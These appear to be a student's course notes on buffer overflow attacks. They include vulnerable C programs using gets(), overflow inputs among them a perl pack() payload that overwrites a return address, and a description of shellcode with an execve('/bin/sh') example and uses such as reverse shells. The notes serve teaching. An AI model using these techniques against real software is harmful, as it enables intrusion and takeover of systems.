(thx diego)
>[!quote] buffer overflow (NIST)
>”a condition at an interface under which more input can be placed into a buffer or data holding area than the capacity allocated, overwriting other information

- attackers exploit such a condition to crash a system or to insert specially crafted code that allows them to *gain control of the system*

Buffer overflow happens because when a process attempts to store data beyond the limits of a fixed-size buffer, it overwrites adjacent memory locations that could hold variables, parameters or program control flow data.
- buffers can be located on the stack, heap, or data section of a process

>[!example] example
>vulnerable code:
>```c
>int main(int argc, char *argv[]) {
>    int valid = FALSE;
>    char str1[8];
>    char str2[8];
>
>    next_tag(str1); // function call to populate str1 with a known value to match
>    gets(str2); //unsafe function to read user input into a fixed-size buffer
>
>    if (strncmp(str1, str2, 8) == 0) 
>        valid = TRUE;
>
>    printf("buffer1: str1(%s), str2(%s), valid(%d)\n", str1, str2, valid);
>}
>```
>(assuming that `str1` and `str2` are adjacent)
>
>the buffers are of fixed size, and the function `gets()` reads input until it encounters a newline character or end-of-file, therefore performing no bounds checking
>- if the user provides an input string *longer than 8 bytes*, the excess data overflows `str2` and overwrites adjacent variables on the stack(e.g. `str1`, the return address of the function)
>
> execution:
>```bash
>## ok example
>$cc -g -o buffer1 buffer1.c$ ./buffer1
>START
>buffer1: str1(START), str2(START), valid(1)
>
>## 14bytes-long string, it corrupts str1
>$ ./buffer1
>EVILINPUTVALUE
>buffer1: str1(TVALUE), str2(EVILINPUTVALUE), valid(0)
>$ ./buffer1
>
>## targeted overflow: input is 16bytes long, and the first half matches the second half. the latter half will overwrite the initial value of str1, changing the match parameter and forcibly making the condition true
>BADINPUTBADINPUT
>buffer1: str1(BADINPUT), str2(BADINPUTBADINPUT), valid(1)
>```
>`printf()` reads `str1` and `str2` until it encounters a NULL termination character
>
>(if `gets()` were a function made to read a user’s logged password, for example, with this buffer overflow exploit we could log into an account without knowing the password)

## attacks
To exploit a buffer overflow, an attacker needs:
- to identify a (buffer overflow) *vulnerability* in some program that can be triggered with data under their control
- to understand how the buffer is *stored in memory* and determine potential for corruption

Vulnerable programs can be identified by *inspecting the program source* code, *tracing the execution* as they process oversized input, or *using tools* such as fuzzing (a process where random data is passed to an application in the hopes that an anomaly will be detected) to automatically identify potentially vulnerable programs.

## stack buffer overflows (stack smashing)
Happen when the target buffer is on the stack.

>[!info] stack frame
> section of the computer's call stack that holds data for a single function call, including its arguments, local variables, and the return address to know where to resume execution after the function finishes.

(see also [[10, 11 - password, buffer overflow#il problema stack smashing|SO2]])

>[!example]- stack overflow example
> vulnerable code:
>```c
>void hello(char *tag)
>{
>    char inp[16]; // Fixed-size buffer of 16 bytes
>
>    printf("Enter value for %s: ", tag);
>    gets(inp); // VULNERABILITY: No bounds checking
>
>    printf("Hello your %s is %s\n", tag, inp);
>}
>```
>
>execution:
>```bash
>$ cc -g -o buffer2 buffer2.c 
>
>$ ./buffer2
>Enter value for name: Bill and Lawrie
>Hello your name is Bill and Lawrie
>
>## the input overflows and continues writing across the stack frame, until it hits and overwrites the return address (and potentially other data). this causes the sex fault
>$ ./buffer2
>Enter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
>Hello your name is XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
>Segmentation fault (core dumped)
>
>## the perl script takes a string of hexadecimal bytes, covertes them into binary data and pipes that binary data directly as the input of ./buffer2
>
>## notice that the program calls hello() twice, and the second time is completely unintended: the attackers have injected a return address that points to a memory location which causes the program to jump back to the start of the `hello()` function
>$ perl -e 'print pack("H*", "41424344454647485152535455565758616263646566676808fcffbf948304080a4e4e4e4e4e0a")' | ./buffer2
>Enter value for name: Hello your Re?pyyJuEa is ABCDEFGHQRSTUVWXYZabcdefguyuy
>Enter value for Kyyu: 
>Hello your Kyyu is NNNN
>Segmentation fault (core dumped)
>```
> the attacker’s attempt (if any) to execute their payload ultimately failed, as the execution flow eventually hit an invalid memory address or attempted an illegal operation

## shellcode
Shellcode is code supplied by the attacker (often saved in the buffer they want to overflow). Traditionally, it transfers control to a shell.

Shell code can also be machine code (specific to the processor and OS) - to create this type of shell code, good assembly skills are needed. More recently, a number of sites and tools have been developed to autoate the process.

 it must be:
 - *self-contained*: it cannot rely on external shared libraries or system files.
 - *position independent code* (*PIC*): it must be able to run corectly no matter where it is located in the process’s memory space. 
	 - since the stack address can shift, the shellocode needs to calculate its own location at runtime
 - *no null bytes* (*\x00*): the `gets()` function stops reading input when it encounters a null byte, therefore shellcode cannot contain any

shellcode functions can do many things:
- launch a remote shell when an attacker connects to it
- create a reverse shell that connects back to the hacker
- use local exploits that establish a shell
- fulsh firewall rules the currently block other attacks
- break out of a chroot environment, giving full access to the system

>[!example] example of UNIX sellcode
the shellcode executes the `/bin/sh` shell
>
>```c
>int main(int argc, char *argv[]) {
>
>// sets the path
>char *sh = "/bin/sh";
>
>// creates an array of arguments that terminates with a NULL pointer
>char *args[2];
>args[0] = sh;
>args[1] = NULL;
>
>// replaces the current running process with the new process (sh)
>execve(sh, args, NULL);
>}
>```
>
>this code is then translated into *PIC* assembly code.
>- in particular, it uses the syscall `execve`
>the hexidecimal values for the compiled machine code is the *shellcode*, which is fed as an input